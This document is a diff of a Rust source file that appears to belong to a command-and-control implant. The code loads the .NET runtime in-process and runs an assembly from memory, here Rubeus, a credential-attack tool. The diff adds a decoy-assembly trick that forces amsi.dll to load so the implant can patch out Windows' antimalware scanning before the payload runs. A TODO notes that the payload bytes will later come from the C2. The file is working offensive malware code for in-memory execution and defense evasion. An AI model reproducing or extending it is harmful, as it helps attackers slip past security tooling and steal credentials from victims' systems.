@@ -3,15 +3,18 @@ use std::{ffi::c_void, ptr::null_mut};
 use windows_sys::{
     Win32::System::{
         ClrHosting::{CLRCreateInstance, CorRuntimeHost},
-        Com::SAFEARRAYBOUND,
-        Ole::{SafeArrayAccessData, SafeArrayCreate, SafeArrayUnaccessData},
-        Variant::{VARIANT, VT_I1},
+        Com::{SAFEARRAY, SAFEARRAYBOUND},
+        Ole::{SafeArrayAccessData, SafeArrayCreateVector, SafeArrayUnaccessData},
+        Variant::{VARIANT, VT_UI1},
     },
     core::GUID,
 };
 
-use crate::execute::ffi::{
-    _AssemblyVtbl, AppDomain, ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost, IUnknown,
+use crate::{
+    evasion::patch_amsi_if_ft_flag,
+    execute::ffi::{
+        _AppDomain, _Assembly, ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost, IUnknown,
+    },
 };
 
 pub enum DotnetError {
@@ -20,6 +23,8 @@ pub enum DotnetError {
     RuntimeNotInitialised(i32),
     CorHostNotInitialised(i32),
     CannotStartRuntime(i32),
+    AssemblyDataNull,
+    SafeArrayNotInitialised,
 }
 
 const GUID_META_HOST: GUID = GUID {
@@ -44,7 +49,7 @@ const GUID_RNTIME_INFO: GUID = GUID {
 };
 
 const GUID_COR_RUNTIME: GUID = GUID {
-    data1: 0xcb2f6723,
+    data1: 0xcb2f6722,
     data2: 0xab3a,
     data3: 0x11d2,
     data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
@@ -59,83 +64,86 @@ const GUID_APP_DOMAIN: GUID = GUID {
 
 pub fn execute_dotnet() -> Result<(), DotnetError> {
     //
-    // SCRATCHPAD
+    // Load the CLR into the process and setup environment to support
     //
-
-    // NOTE: This fn could be turned into a sub-DLL or something we can inject into a sacrificial process if
-    // we want it loaded in a foreign process?
-
-    // https://stackoverflow.com/questions/35670546/invoking-dotnet-assembly-method-from-c-returns-error-cor-e-safearraytypemismat
-    // https://stackoverflow.com/questions/335085/hosting-clr-bad-parameters
-
-    // For local dev, from a stack overflow post:
-    // 1) Load  dotnet file into a string
-    // 2) Copy file data into a SAFEARRAY
-    // 3) Load managed assembly
-    // 4) Get entrypoint of the assembly
-    // 5) Get params of entrypoint and save in SAFEARRAY
-    // 6) Call entrypoint, passing in params
-
-    //
-    // CODE SECTION
-    //
-
-    println!("Starting CLR stuff");
     let meta = create_clr_instance()?;
-    println!("meta: {meta:p}");
     let runtime = get_runtime_v4(meta)?;
-    println!("RT: {runtime:p}");
-    let host = get_cor_runtime_host(runtime)?;
-    println!("host: {host:p}");
+    let host: *mut ICorRuntimeHost = get_cor_runtime_host(runtime)?;
     start_runtime(host)?;
-    println!("RT started");
+    let app_domain = get_default_appdomain(host)?;
 
     // Read file
-    let f = std::fs::read(r"C:\Users\flux\git\Rubeus\Rubeus\bin\Release\Rubeus.exe")
-        .expect("could not read file");
+    // TODO this will be bytes sent from the C2
+    let f = std::fs::read(r"C:\tmp\Rubeus.exe").expect("could not read file");
+    let p_sa = create_safe_array(&f)?;
 
-    // Copy file into a SAFEARRAY
-    let bounds = create_safe_array_bounds(f.len())?;
-    let p_sa = unsafe { SafeArrayCreate(VT_I1, 1, &bounds) };
+    // Create a junk decoy safe array such that we force a load of AMSI to then patch out
+    let decoy_buf = [0x00, 0x00, 0x00, 0x01];
+    let p_decoy_sa = create_safe_array(&decoy_buf)?;
 
-    // TODO ?
-    // println!("Create domain");
-    println!("Calling GetDefaultDomain");
-    let app_domain = get_default_appdomain(host)?;
-    println!("Called GetDefaultDomain");
+    //
+    // First load the decoy binary into the process; this is to bring in amsi.dll such that we can patch
+    // it should the operator have instructed the process to do so.
+    // After that, then we can load in the target assembly via the same load_3.
+    //
+    let mut sp_assembly: *mut _Assembly = std::ptr::null_mut();
+    let load_3 = unsafe { (*(*app_domain).vtable).Load_3 };
 
-    let mut p_data = null_mut();
-    let todo = unsafe { SafeArrayAccessData(p_sa, &mut p_data) };
-    unsafe { std::ptr::copy_nonoverlapping(f.as_ptr(), p_data as *mut u8, f.len()) };
-    let todo = unsafe { SafeArrayUnaccessData(p_sa) };
+    // Decoy
+    let res = unsafe { load_3(app_domain as *mut _, p_decoy_sa, &mut sp_assembly) };
 
-    println!("Loading managed assembly");
-    let mut sp_assembly: *mut _AssemblyVtbl = null_mut();
-    unsafe {
-        ((*(*app_domain).vtable).Load_3)(
-            app_domain as *mut _,
-            p_sa,
-            &mut sp_assembly as *mut *mut _,
-        )
-    };
+    patch_amsi_if_ft_flag();
 
-    // Get the entrypoint of the assembly, which should be the "Main" function
-    println!("Get entrypoint");
+    // Reset assembly and load the assembly with AMSI patched
+    sp_assembly = null_mut();
+    let res = unsafe { load_3(app_domain as *mut _, p_sa, &mut sp_assembly) };
+
+    if sp_assembly.is_null() {
+        #[cfg(debug_assertions)]
+        {
+            use shared::pretty_print::print_failed;
+            print_failed(&format!("Assembly ptr was null. Error: {res:#X}"));
+        }
+
+        return Err(DotnetError::AssemblyDataNull);
+    }
+
+    //
+    // Get the entrypoint of the assembly, should be Main?
+    //
     let mut entryp = null_mut();
-    let h_result = unsafe { ((*sp_assembly).get_EntryPoint)(sp_assembly as *mut _, &mut entryp) };
+    let h_result =
+        unsafe { ((*(*sp_assembly).vtable).get_EntryPoint)(sp_assembly as *mut _, &mut entryp) };
 
-    println!("hres entryp: {h_result:#X}");
     let mut retval = VARIANT::default();
     let object = VARIANT::default();
 
+    //
+    // Now we can call the entrypoint via Invoke_3 which runs the assembly in our process
+    //
     let vt = unsafe { &(*(*entryp).vtable) };
     unsafe { (vt.Invoke_3)(entryp as *mut _, object, null_mut(), &mut retval) };
 
+    // TODO this is very wrong lol
     println!("Ret val: {:?}", unsafe {
         retval.Anonymous.Anonymous.Anonymous.intVal
     });
 
     Ok(())
+}
+
+fn create_safe_array(buf: &[u8]) -> Result<*mut SAFEARRAY, DotnetError> {
+    let p_sa = unsafe { SafeArrayCreateVector(VT_UI1 as u16, 0, buf.len() as u32) };
+    if p_sa.is_null() {
+        return Err(DotnetError::SafeArrayNotInitialised);
+    }
+
+    let mut p_data = null_mut();
+    let todo = unsafe { SafeArrayAccessData(p_sa, &mut p_data) };
+    unsafe { std::ptr::copy_nonoverlapping(buf.as_ptr(), p_data as *mut u8, buf.len()) };
+    let todo = unsafe { SafeArrayUnaccessData(p_sa) };
+
+    Ok(p_sa)
 }
 
 fn create_clr_instance() -> Result<*mut ICLRMetaHost, DotnetError> {
@@ -179,8 +187,6 @@ fn get_runtime_v4(meta: *mut ICLRMetaHost) -> Result<*mut ICLRRuntimeInfo, Dotne
 fn get_cor_runtime_host(
     runtime: *mut ICLRRuntimeInfo,
 ) -> Result<*mut ICorRuntimeHost, DotnetError> {
-    // let vtbl = (unsafe { &*(runtime) }).lpVtbl;
-
     let get_interface = unsafe { &*(*runtime).vtable }.GetInterface;
 
     let mut p_host: *mut c_void = std::ptr::null_mut();
@@ -203,17 +209,15 @@ fn start_runtime(host: *mut ICorRuntimeHost) -> Result<(), DotnetError> {
     }
 }
 
-fn get_default_appdomain(host: *mut ICorRuntimeHost) -> Result<*mut AppDomain, DotnetError> {
+fn get_default_appdomain(host: *mut ICorRuntimeHost) -> Result<*mut _AppDomain, DotnetError> {
     let host_vtbl = unsafe { &*(*host).vtable };
 
-    // GetDefaultDomain returns IUnknown**
     let mut unk = null_mut();
     let hr = unsafe { (host_vtbl.GetDefaultDomain)(host, &mut unk as *mut *mut _) };
     if hr < 0 {
         return Err(DotnetError::CorHostNotInitialised(hr));
     }
 
-    // QI for _AppDomain
     let unk = unk as *mut IUnknown;
     let query_interface = unsafe { (*(*unk).lpVtbl).QueryInterface };
     let mut appdomain_ptr: *mut c_void = null_mut();
@@ -223,5 +227,5 @@ fn get_default_appdomain(host: *mut ICorRuntimeHost) -> Result<*mut AppDomain, D
         return Err(DotnetError::CorHostNotInitialised(hr));
     }
 
-    Ok(appdomain_ptr as *mut AppDomain)
+    Ok(appdomain_ptr as *mut _AppDomain)
 }
